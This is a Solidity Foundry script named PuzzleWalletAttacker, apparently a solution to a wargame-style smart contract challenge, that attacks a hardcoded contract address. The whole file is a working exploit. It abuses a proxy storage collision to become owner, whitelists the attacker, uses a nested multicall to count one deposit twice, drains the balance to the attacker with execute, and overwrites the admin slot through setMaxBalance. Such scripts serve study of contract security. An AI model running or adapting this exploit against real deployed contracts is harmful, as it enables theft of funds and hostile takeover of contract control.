// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract PuzzleWalletAttacker is Script, HelperConfigLib {
    function run() external {
        vm.startBroadcast(ATTACKER_KEY);
        address payable victimAddress = payable(
            0xB171D866832A106B680c555EE020De47fD62cae1
        );

        (bool success, ) = victimAddress.call(
            abi.encodeWithSignature(
                "proposeNewAdmin(address)",
                ATTACKER_ADDRESS
            )
        );

        require(success, "proposing New Admin tx failed");

        (bool whitelistSuccess, ) = victimAddress.call(
            abi.encodeWithSignature("addToWhitelist(address)", ATTACKER_ADDRESS)
        );

        require(whitelistSuccess, "addToWhitelist tx failed");

        // Use multicall to drain the victim's fund
        bytes memory depositFnSelector = abi.encodeWithSignature("deposit()");
        bytes[] memory multicallSelector2CallDatas = new bytes[](1);
        multicallSelector2CallDatas[0] = depositFnSelector;
        bytes memory multicallSelector2 = abi.encodeWithSignature(
            "multicall(bytes[])",
            multicallSelector2CallDatas
        );

        bytes[] memory multicallSelector1CallDatas = new bytes[](2);
        multicallSelector1CallDatas[0] = depositFnSelector;
        multicallSelector1CallDatas[1] = multicallSelector2;

        (bool doubleDepositWithMulticallSuccess, ) = victimAddress.call{
            value: 0.001 ether
        }(
            abi.encodeWithSignature(
                "multicall(bytes[])",
                multicallSelector1CallDatas
            )
        );

        require(doubleDepositWithMulticallSuccess, "Double Deposit failed");

        (bool drainBalanceWithExecuteSuccess, ) = victimAddress.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                ATTACKER_ADDRESS,
                0.002 ether,
                abi.encodeWithSignature("")
            )
        );

        require(drainBalanceWithExecuteSuccess, "balance drain failed");

        (bool maxBalanceChgSuccess, ) = victimAddress.call(
            abi.encodeWithSignature(
                "setMaxBalance(uint256)",
                uint256(uint160(ATTACKER_ADDRESS))
            )
        );

        require(maxBalanceChgSuccess, "max balance change failed");

        vm.stopBroadcast();
    }
}
